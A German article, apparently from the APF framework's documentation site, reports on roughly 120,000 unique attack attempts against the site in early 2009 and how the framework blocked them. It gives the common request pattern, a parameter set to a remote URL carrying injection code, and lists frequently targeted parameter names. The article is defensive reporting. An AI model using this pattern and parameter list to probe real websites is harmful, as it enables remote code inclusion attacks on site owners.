Der Artikel "XSS-Attacks 2009" zeigt, wie die APF-Dokumentationswebseite durch das Framework erfolgreich vor XSS-Attacken geschützt werden konnte. Allein in den ersten vier Monaten wurden über 120000 eindeutige Einbruchsversuche verzeichnet, die durch die Mechanismen abgefangen wurden.

1. Einleitung

Im Jahr 2009 ist eine deastisch gestiegene Anzahl an XSS-Angriffen auf Webseiten zu verzeichnen. Allein in den ersten vier Monaten konnten auf der APF-Webseite über 120.000 eindeutige Angriffsversuche verzeichnet werden. Die Zahl der absoluten Angriffe beläuft sich derzeit (Ende April 2009) auf rund eine 500.000 Versuche.


2. Angriffe

Wie bereits im Artikel Hacking & das APF beschrieben handelt es sich bei der Art der Angriffe meist um XSS-Attacken, die versuchen eine Schwachstelle auszunutzen um eigenen Code einzuschleusen. Die Signatur der Requests folgt bei 95% aller Versuche folgendem Muster: [?|&]vulnerability_param=http://domain.tld/some/path/injection_code.ext Die Namen der Parameter variieren dabei sehr stark:
  • tpl_pgb_moddir
  • page
  • mosConfig_absolute_path
  • sourcedir
  • file
  • dir[inc]
  • includedir
  • phpbb_root_path
  • _SERVER[DOCUMENT_ROOT]
  • _zb_path
  • cfg[path][contenido]
  • base_folder
  • spaw_root
  • includePath
